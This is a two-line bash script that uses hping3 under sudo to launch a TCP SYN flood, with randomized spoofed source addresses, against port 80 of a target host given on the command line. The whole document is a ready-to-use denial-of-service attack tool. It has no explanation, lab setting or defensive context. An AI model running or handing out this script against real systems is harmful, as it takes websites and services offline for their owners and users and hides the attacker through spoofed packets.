#!/bin/bash
sudo hping3 --rand-source --flood -S -p 80 $1
